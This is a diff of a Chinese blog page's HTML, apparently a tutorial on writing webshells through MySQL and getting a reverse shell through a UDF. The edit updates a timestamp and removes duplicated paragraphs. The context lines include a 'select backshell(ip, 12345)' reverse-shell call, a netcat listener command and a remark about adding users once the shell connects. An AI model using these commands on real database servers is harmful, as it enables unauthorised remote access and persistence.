@@ -88,7 +88,7 @@
 <meta property="og:site_name" content="白仁的博客">
 <meta property="og:description" content="MYSQL写Webshell写Webshell比较常见的方法有：  select … into outfile general_log   select … into outfile1.利用条件 对web目录有写权限 GPC关闭（能使用单引号） 有绝对路径（读文件可以不用，写文件必须） 没有配置 –secure-file-priv  2.利用方式 有 union  12id=2) union se">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-03-02T02:55:26.838Z">
+<meta property="og:updated_time" content="2020-03-03T09:42:44.444Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -446,9 +446,7 @@
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell("你的ip地址",12345);</span><br></pre></td></tr></table></figure>
 
-<p>最后就是执行backshell<br>select backshell(“你的ip地址”,12345);<br>1</p>
-<p>在具备独立主机的服务器上执行监听<br>nc -vv -l -p 12345<br>1<br>最后就是执行backshell<br>select backshell(“你的ip地址”,12345);<br>1</p>
-<p>但是我是通过webshell将udf.dll导入plugin目录完成的，如果成功返回了shell则说明成功了，我们就可以添加用户了</p>
+<p>但是我是通过webshell将udf.dll导入plugin目录完成的，如果成功返回了shell则说明成功了，我们就可以添加用户了。</p>
 
       
     </div>
